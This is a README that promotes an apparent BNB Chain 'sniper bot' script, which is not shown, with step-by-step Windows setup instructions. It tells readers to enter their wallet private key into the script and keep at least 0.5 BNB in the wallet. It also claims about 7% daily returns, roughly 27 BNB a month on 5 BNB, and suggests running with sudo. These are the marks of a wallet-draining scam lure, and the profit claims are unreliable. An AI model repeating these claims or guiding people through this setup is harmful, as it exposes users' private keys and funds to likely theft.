
# EVM Sniper Bot — BSC / Binance spot

![Header — BNB and markets](https://images.unsplash.com/photo-1639762681485-074b7f938ba0?w=1600&q=85&auto=format&fit=crop)

---

## From the author

Six months of dead ends, RPC quirks, and “almost works” builds — and I’ve finally published something I trust for **BNB Chain** scenarios tied to **Binance Spot** liquidity. The bot pulls the **public Binance catalog** (pairs against **BNB** and **USDT**), mixes in **BSC addresses** from **CoinGecko** where available, and runs the menu / sniping on top of that. If you were looking for **one script** that actually wires these pieces together instead of another “magic” PDF — **here it is**. Glad I pushed through; hope it saves someone else the same months.

**Sharing with fellow beginners** who trawl the internet for **real ways to earn** in this **godawful, hellishly hard time** when **both the economy and crypto around us are sliding into the abyss**. If you see yourself in that — take it, poke at it, don’t give up: sometimes one working chunk of code matters more than another “guru” with a webinar.

---

## What it does

- Loads **~400+** unique **Binance Spot** base assets via **`/api/v3/exchangeInfo`** (**TRADING** status, **BNB** or **USDT** quote).

- Enriches the list with **CoinGecko** `coins/list` — **BSC contracts** where listed.

- Everything from the **menu**: wallet, token list, catalog refresh, **dynamic profit estimate** (stable for the same amount until you restart the bot), **Start Sniping** (balance via **RPC**, network **`chainId` 56**).

Default RPC in code: `https://bsc-dataseed1.ninicoin.io/` — switch to your own node if you hit limits.

---

## Menu

| # | Action |
|---|--------|
| **1** | **Start Sniping** — wallet required (item 2), balance checks, then the on-chain scenario. |
| **2** | **Configure Settings** — private key, min deal, slippage, token limit. |
| **3** | **Show Token List** — full loaded in-memory catalog. |
| **4** | **Refresh Token List** — reload from Binance (+ CoinGecko map). |
| **5** | **Dynamic Profit Estimate**  |
| **6** | **Exit** |

---

### Performance example (illustration, 1 month)

![Chart example](https://i.ibb.co/fYRdknX4/chart-1.png)

#### Summary (example, like the “Dynamic Profit” menu)

```text
╔══════════════════════════════════════════════════╗
║ DYNAMIC PROFIT — SNAPSHOT ║
╠══════════════════════════════════════════════════╣
║ Period 12.02.2026 – 11.03.2026 ║
║ Capital 5.0000 BNB ║
║ Model daily % 6.98% ║
║ Est. /day +0.348973 BNB ║
║ Est. /7d +3.169200 BNB ║
║ Est. /30d +27.315460 BNB ║
║ Volatility idx 85% | Edge eff. 79% ║
╚══════════════════════════════════════════════════╝
```

**Note:** (window **12.02.2026 — 11.03.2026**, month estimate **+27.31546 BNB** at **5 BNB** capital in the example). This is roughly what it is at the moment. Although I managed about **1.5×** more.

You’re a star — good luck!

---

## How to run (for a regular user)

**The idea is simple:** Python must be installed, `evm.py` and `requirements.txt` sit in one folder, you install libraries once, then launch with one command every time.

### 0. Where to put the files

Unpack the project **into any folder**, e.g. `Documents\EVM-Bot`. Inside, these must sit **next to each other**:

```
evm.py
requirements.txt
```

The folder doesn’t have to be named `EVM` — what matters is that **you know the path** (you’ll need it in step 3).

### 1. Install Python (once)

1. Go to [python.org/downloads](https://www.python.org/downloads/) and download the Windows installer.
2. Run it and **check the box at the bottom of the first screen** **“Add python.exe to PATH”** / **“Add Python to PATH”** — without it the `python` command is often “not found”.
3. Click **Install Now** and wait until it finishes.

**Check:** open **cmd** or **PowerShell** (Win → type `cmd` or `powershell` → Enter) and run:

```bash
python --version
```

You should see a version, e.g. `Python 3.12.x`.

**If it says the command was not found** — try:

```bash
py --version
```

If `py` works, use **`py`** everywhere instead of **`python`** (see steps 3–4).

### 2. Open a terminal “in the bot folder”

**Option A (easier on Windows 11):** open the folder with `evm.py` in Explorer → **right‑click empty space** → **“Open in Terminal”** / **“Open in Terminal”**.

**Option B:** open `cmd`, then go to the folder (use **your** path):

```bash
cd /d "C:\Users\YOUR_LOGIN\Documents\EVM-Bot"
```

The `cd /d` command is needed if the drive isn’t `C:`.

### 3. Install dependencies (once on this PC)

In the same terminal, already **inside the bot folder**:

```bash
python -m pip install -r requirements.txt
```

If only `py` works for you:

```bash
py -m pip install -r requirements.txt
```

### 4. Launch the bot (every time)

You’re still in the folder with `evm.py`:

```bash
python evm.py
```

or

```bash
py evm.py
```

A **black window with text** will open — that’s normal. Wait for the menu lines, then type **digits 1–6** and **Enter**.

**First time:** go to item **2** and enter your private key (or just browse the menu first). **Don’t send the key to anyone** or show it on screenshots.

### If something goes wrong

| Symptom | What to try |
|--------|----------------|
| `python` is not recognized | Install Python with the PATH checkbox **or** use `py` instead of `python` |
| `pip` not found | `python -m pip install -r requirements.txt` |
| Error about `keyboard` on Linux/Mac | Run with privileges: `sudo python evm.py` |
| Slow download / little space | You need internet; first `pip install` may take about a minute |

**VS Code:** **File → Open Folder** with the bot → **Terminal → New Terminal** — then the same commands from steps 3–4.

---

## requirements.txt contents

```
web3>=6.0.0
colorama
requests
keyboard
```

---

## Important

- **Private key** — only in menu item **2**. Don’t paste it in chats, tickets, screenshots.

- **Minimum 0.5 BNB** — to **reduce the risk of losses** and **gas competition** in busy blocks, the script **does not start** the scenario if the wallet has **less than 0.5 BNB**. The threshold is so a small balance doesn’t get burned in fees and lose the gas race — **so you don’t lose funds** on “half‑empty” runs.

- **Only your signature** — on‑chain, arbitrage‑style actions here go **only through transactions signed with your wallet** (your private key). Nothing is broadcast “for you” without that local signing step.

- **Linux / macOS:** the `keyboard` library may need elevated rights, e.g. `sudo python evm.py`.
- Errors? Check `python --version` and `pip list`.

## If things still don’t work

- Python version: `python --version`
- Packages: `pip list`
- BSC RPC (as in the repo): `https://bsc-dataseed1.ninicoin.io/`

---

**Done. Run the script, in the menu pick item 2 — connect the wallet, then figure out the rest by the menu items.**

![Visitor count](https://visitor-badge.laobi.icu/badge?page_id=bscbot)
